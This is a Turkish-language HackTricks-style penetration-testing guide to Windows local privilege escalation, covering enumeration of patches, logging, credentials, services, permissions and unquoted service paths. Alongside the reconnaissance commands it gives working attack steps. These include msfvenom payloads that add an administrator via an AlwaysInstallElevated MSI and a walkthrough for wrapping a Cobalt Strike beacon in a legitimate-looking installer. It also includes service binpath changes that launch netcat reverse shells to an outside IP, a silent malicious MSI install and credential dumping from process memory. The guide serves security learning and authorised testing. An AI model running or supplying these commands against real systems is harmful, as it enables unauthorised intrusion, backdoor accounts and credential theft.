# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## İlk Windows Teorisi

### Access Tokens

**Eğer Windows Access Tokens'in ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'taki integrity levels'in ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okumalisiniz:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Kontrolleri

Windows'ta sistemin taranmasını engelleyebilecek, yürütülebilir dosyaları çalıştırmanızı önleyebilecek veya hatta aktivitelerinizi tespit edebilecek çeşitli öğeler vardır. Privilege escalation enumerasyonuna başlamadan önce aşağıdaki sayfayı okumalı ve tüm bu savunma mekanizmalarını listelemelisiniz:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Sistem Bilgisi

### Sürüm bilgisi enumerasyonu

Windows sürümünün bilinen herhangi bir açığı olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlı. Bu veritabanında 4.700'den fazla güvenlik açığı bulunuyor; Windows ortamının sunduğu **massive attack surface**'ı gösteriyor.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas içinde watson gömülü)_

**Yerelde sistem bilgileri ile**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Herhangi bir kimlik bilgisi/değerli bilgi env değişkenlerinde kayıtlı mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi şu adresten öğrenebilirsiniz: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmeleriyle ilgili ayrıntılar kaydedilir; yürütülen komutlar, komut çağrıları ve betiklerin parçalarını kapsar. Ancak tüm yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için dokümantasyondaki "Transcript files" bölümündeki talimatları izleyin; **"Module Logging"**'i **"Powershell Transcription"** yerine tercih edin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell günlüklerinden son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Betiğin yürütülmesinin tam etkinlik ve içerik kaydı tutulur; böylece her kod bloğu çalışırken belgelenir. Bu süreç, adli inceleme ve kötü amaçlı davranışların analizinde değerli olan kapsamlı bir denetim izini korur. Yürütme anında tüm etkinlikler belgelenerek sürece ilişkin ayrıntılı içgörüler sağlanır.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için olay kayıtları Windows Event Viewer'da şu yolda bulunur: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** yerine http ile talep ediliyorsa sistemi ele geçirebilirsiniz.

Başlangıç olarak, ağın non-SSL WSUS güncellemesi kullanıp kullanmadığını kontrol etmek için cmd'de aşağıdakini çalıştırın:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdakiler:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Bunlardan biri gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve eğer `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

O zaman, **istismar edilebilir.** Eğer son kayıt değeri `0` ise, WSUS girdisi yok sayılacaktır.

Bu zafiyeti istismar etmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Bunlar MiTM amaçlı, non-SSL WSUS trafiğine 'sahte' güncellemeler enjekte eden exploit scriptleridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Tam raporu burada okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temelde, bu hatanın istismar ettiği kusur şudur:

> Eğer yerel kullanıcı proxy’imizi değiştirme yetkimiz varsa ve Windows Update, Internet Explorer’ın ayarlarında yapılandırılmış proxy’yi kullanıyorsa, bu durumda [PyWSUS](https://github.com/GoSecure/pywsus)’u yerel olarak çalıştırıp kendi trafiğimizi yakalayabilir ve varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırabiliriz.
>
> Dahası, WSUS servisi geçerli kullanıcının ayarlarını kullandığı için onun sertifika deposunu da kullanır. WSUS hostname’i için self-signed bir sertifika üretip bu sertifikayı geçerli kullanıcının sertifika deposuna eklersek, hem HTTP hem de HTTPS WSUS trafiğini yakalayabiliriz. WSUS, sertifika üzerinde trust-on-first-use benzeri bir doğrulama uygulamak için HSTS-benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir ise ve doğru hostname’e sahipse, servis tarafından kabul edilir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla (serbest kaldığında) istismar edebilirsiniz.

## Üçüncü Taraf Otomatik Güncelleyiciler ve Ajan IPC (local privesc)

Birçok kurumsal ajan, localhost üzerinde bir IPC yüzeyi ve ayrıcalıklı bir güncelleme kanalı açar. Kayıt bir saldırgan sunucusuna zorlanabiliyor ve updater sahte bir root CA’ya veya zayıf imzalayıcı kontrollerine güveniyorsa, yerel bir kullanıcı SYSTEM servisine yüklenen zararlı bir MSI teslim edebilir. Genel bir teknik (Netskope stAgentSvc zincirine dayalı – CVE-2025-0309) için bakınız:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** zafiyeti vardır. Bu koşullar, **LDAP signing zorunlu değilse**, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırma hakkına sahip olmaları ve kullanıcıların domain içinde bilgisayar oluşturabilme yeteneğini içermektedir. Bu **gereksinimlerin** varsayılan ayarlarla sağlandığını unutmamak önemlidir.

Exploit'i şurada bulun: [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Saldırının akışı hakkında daha fazla bilgi için bkz. https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/

## AlwaysInstallElevated

**Eğer** bu 2 kayıt **etkinse** (değer **0x1** ise), o zaman her seviyeden kullanıcı `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Geçerli dizinde ayrıcalıkları yükseltmek için bir Windows MSI binary oluşturmak üzere power-up içinden `Write-UserAddMSI` komutunu kullanın. Bu script, user/group addition için prompt veren ön-derlenmiş bir MSI installer yazar (bu yüzden GIU access gerekecektir):
```
Write-UserAddMSI
```
Yetkileri yükseltmek için oluşturulan ikiliyi çalıştırmanız yeterlidir.

### MSI Wrapper

Bu öğreticiyi, bu araçları kullanarak bir MSI wrapper oluşturmayı öğrenmek için okuyun. Sadece komut satırlarını çalıştırmak istiyorsanız bir "**.bat**" dosyasını sarmalayabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Cobalt Strike** veya **Metasploit** ile `C:\privesc\beacon.exe` konumunda yeni bir **Windows EXE TCP payload** oluşturun
- **Visual Studio**'yu açın, **Create a new project**'ı seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir isim verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini işaretleyin ve **Create**'a tıklayın.
- Dahil edilecek dosyaları seçme adımı olan 4 adımın 3. adımına gelene kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'u seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer** içinde **AlwaysPrivesc** projesini seçin ve **Properties**'de **TargetPlatform**'ı **x86**'dan **x64**'e değiştirin.
- Yüklü uygulamayı daha meşru gösterebilecek **Author** ve **Manufacturer** gibi değiştirebileceğiniz diğer özellikler de vardır.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'e sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, kurucu çalıştırıldığında beacon payload'unun hemen yürütülmesini sağlar.
- **Custom Action Properties** altında **Run64Bit**'i **True** olarak değiştirin.
- Son olarak, **derleyin**.
- Eğer `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Installation

Kötü amaçlı `.msi` dosyasının arka planda **kurulumunu** yürütmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu güvenlik açığını istismar etmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirus ve Tespit Araçları

### Denetim Ayarları

Bu ayarlar hangi bilgilerin **kaydedileceğine** karar verir, bu yüzden dikkat etmelisiniz.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, logların nereye gönderildiğini bilmek ilginçtir
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** domain'e katılmış bilgisayarlarda yerel Administrator parolalarının yönetimi için tasarlanmıştır; her parolanın benzersiz, rastgele ve düzenli olarak güncellendiğinden emin olur. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACLs aracılığıyla yeterli izinlere sahip kullanıcılara erişim verilir; yetkilendirilmiş kullanıcılar yerel admin parolalarını görüntüleyebilir.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Eğer etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**WDigest hakkında daha fazla bilgi için bu sayfaya bakın**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**'den itibaren, Microsoft, Local Security Authority (LSA) için güvensiz süreçlerin **belleğini okumaya** veya kod enjekte etmeye yönelik girişimlerini **engellemek** amacıyla gelişmiş bir koruma sundu ve böylece sistemi daha da güvenli hale getirdi.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** Windows 10'da tanıtıldı. Amacı, cihazda depolanan kimlik bilgilerini pass-the-hash gibi tehditlere karşı korumaktır.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının logon verileri kayıtlı bir security package tarafından doğrulandığında, o kullanıcı için domain credentials genellikle oluşturulur.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar ve Gruuplar

### Kullanıcılar ve Grupları Listeleme

Ait olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer bir **ayrıcalıklı gruba aitseniz, ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar ve bunları ayrıcalık yükseltmek için nasıl kötüye kullanabileceğinizi öğrenin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipülasyonu

**Daha fazla bilgi edinin** bir **token**'in ne olduğunu bu sayfada: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Aşağıdaki sayfayı kontrol ederek **ilginç token'lar hakkında bilgi edinin** ve bunları nasıl kötüye kullanabileceğinizi öğrenin:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Giriş yapmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Kullanıcı dizinleri
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Panonun içeriğini al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan Süreçler

### Dosya ve Klasör İzinleri

Öncelikle süreçleri listeleyip sürecin komut satırında parola/parolalar olup olmadığını **kontrol edin**.\
Çalışan bazı binary'leri **overwrite edip edemeyeceğinizi** veya binary klasöründe yazma izninizin olup olmadığını kontrol edin; olası [**DLL Hijacking attacks**](dll-hijacking/index.html) için:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman olası [**electron/cef/chromium debuggers** çalışıyor olabilir, bunu ayrıcalık yükseltmek için kötüye kullanabilirsiniz](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Süreçlerin binary dosyalarının izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Proses binary'lerinin bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Çalışan bir sürecin bellek dökümünü sysinternals'dan **procdump** kullanarak oluşturabilirsiniz. FTP gibi servislerde bellekte **credentials in clear text in memory** bulunur; belleği döküp credentials'ları okuyun.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" arayın, "Click to open Command Prompt"e tıklayın

## Servisler

Servislerin listesini al:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servisin bilgilerini almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her servis için gerekli ayrıcalık seviyesini kontrol etmek üzere _Sysinternals_'ten **accesschk** ikili dosyasına sahip olmak önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
“Authenticated Users”'in herhangi bir servisi değiştirebilip değiştiremeyeceğinin kontrol edilmesi önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Bunu etkinleştirmek için şunu kullanabilirsiniz:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost hizmetinin çalışması için SSDPSRV'ye bağlı olduğunu unutmayın (XP SP1 için)**

**Bu sorunun başka bir çözümü** şu komutu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

Bir serviste "Authenticated users" grubunun **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, servisin çalıştırılabilir binary'sini değiştirmek mümkündür. Değiştirmek ve çalıştırmak için **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servisin çalıştırdığı ikili dosyanın yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasına olanak sağlar; bu da servis yapılandırmalarını değiştirme yeteneği verir.
- **WRITE_OWNER**: Sahiplik devralma ve izinlerin yeniden yapılandırılmasına izin verir.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yeteneğine sahiptir.
- **GENERIC_ALL**: Aynı şekilde servis yapılandırmalarını değiştirme yeteneğine sahiptir.

Bu zafiyetin tespiti ve sömürüsü için _exploit/windows/local/service_permissions_ kullanılabilir.

### Services binaries weak permissions

**Bir servis tarafından çalıştırılan ikili dosyayı değiştirebilir misiniz** veya ikili dosyanın bulunduğu klasörde **yazma izniniz var mı** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir servisin çalıştırdığı tüm ikili dosyaları **wmic** ile (system32'de olmayanlar) alabilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Servis kayıt defteri değiştirme izinleri

Herhangi bir servis kayıt defterini değiştirebilip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir servis **kayıt defteri** üzerindeki **izinlerinizi** **kontrol** etmek için şunu yapabilirsiniz:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE**'in `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer sahipse, servis tarafından çalıştırılan binary değiştirilebilir.

Servis tarafından çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory izinleri

Eğer bir registry üzerinde bu izne sahipseniz bu, **bu kayıttan alt kayıtlar oluşturabileceğiniz** anlamına gelir. Windows services durumunda bu, **herhangi bir kodu çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Eğer bir çalıştırılabilir dosyanın yolu tırnak içinde değilse, Windows boşluktan önceki her parçayı çalıştırmayı deneyecektir.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows hizmetlerine ait olmayan tüm tırnaklanmamış hizmet yollarını listele:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu zafiyeti tespit edip exploit edebilirsiniz** metasploit ile: `exploit/windows/local/trusted\_service\_path` Manuel olarak metasploit ile bir service binary oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma Eylemleri

Windows, bir servis başarısız olduğunda alınacak eylemleri kullanıcıların belirtmesine izin verir. Bu özellik bir binary'ye işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebilirse, privilege escalation mümkün olabilir. Daha fazla ayrıntı [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Uygulamalar

### Yüklü Uygulamalar

Kontrol edin **permissions of the binaries** (maybe you can overwrite one and escalate privileges) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı özel dosyaları okumak için bazı config file'ları değiştirebilip değiştiremeyeceğinizi veya Administrator hesabı (schedtasks) tarafından çalıştırılacak bir binary'i değiştirebilip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

